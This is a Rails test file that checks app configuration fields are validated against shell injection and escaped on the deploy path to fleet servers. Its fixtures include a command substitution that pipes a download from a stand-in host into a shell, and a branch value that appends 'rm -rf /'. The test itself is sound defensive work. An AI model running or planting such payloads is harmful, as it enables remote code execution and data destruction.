require "test_helper"

# Several operator-editable App fields reach REMOTE SHELL COMMANDS on fleet
# servers — git clone, docker build, curl, docker run. Two defences, both tested
# here: the value can't be stored, and if a legacy row already holds one, the
# deploy path escapes it.
class AppShellSafetyTest < ActiveSupport::TestCase
  INJECTION = "$(curl evil.example/x|sh)".freeze

  setup do
    @org = Organization.create!(name: "Acme")
    @server = @org.servers.create!(name: "box", status: "online", ip_address: "10.0.0.1")
    @app = @org.apps.create!(name: "Shop", slug: "shop", server: @server, deploy_method: "docker",
                             port: 3000, image_name: "shop", repository_url: "https://github.com/x/y.git")
  end

  # --- defence 1: the value cannot be stored ------------------------------

  test "slug rejects shell metacharacters" do
    @app.slug = "shop#{INJECTION}"
    assert_not @app.valid?
    assert_includes @app.errors[:slug].to_s, "may contain only"
  end

  test "branch rejects shell metacharacters" do
    @app.branch = "main; rm -rf /"
    assert_not @app.valid?
  end

  test "repository_url must be an https or git URL" do
    @app.repository_url = "https://github.com/x/y.git#{INJECTION}"
    assert_not @app.valid?

    @app.repository_url = "git@github.com:x/y.git"
    assert @app.valid?, @app.errors.full_messages.to_sentence
  end

  test "dockerfile_path rejects shell metacharacters" do
    @app.dockerfile_path = "Dockerfile#{INJECTION}"
    assert_not @app.valid?
  end

  test "image_name rejects shell metacharacters" do
    @app.image_name = "shop#{INJECTION}"
    assert_not @app.valid?
  end

  test "health_check_path must be a plain path" do
    @app.health_check_path = "/up#{INJECTION}"
    assert_not @app.valid?

    @app.health_check_path = "/healthz"
    assert @app.valid?
  end

  test "ordinary values still validate" do
    @app.assign_attributes(branch: "feature/thing-1", dockerfile_path: "docker/Dockerfile.prod",
                           image_name: "ghcr.io/acme/shop", health_check_path: "/up")
    assert @app.valid?, @app.errors.full_messages.to_sentence
  end

  # --- defence 2: the deploy path escapes anyway --------------------------
  #
  # Rows predating the validations can still hold hostile values, and escaping
  # must not depend on the validation having run.

  test "the deploy path escapes values that bypassed validation" do
    @app.update_columns(branch: "main#{INJECTION}", dockerfile_path: "Dockerfile#{INJECTION}")

    ssh = Class.new do
      attr_reader :commands
      def initialize = @commands = []
      def execute_with_status(cmd) = (@commands << cmd; { success: true, output: "", stderr: "" })
      def output = ""
    end.new

    deployment = @app.deployments.create!(status: "deploying")
    deployer = AppDeployer.new(@app.reload, deployment)
    deployer.stub(:ssh, ssh) do
      deployer.send(:clone_or_pull_repo)
      deployer.send(:build_image)
    end

    ssh.commands.each do |cmd|
      assert_not_includes cmd, "$(curl", "an unescaped command substitution reached the shell: #{cmd}"
    end
  end
end
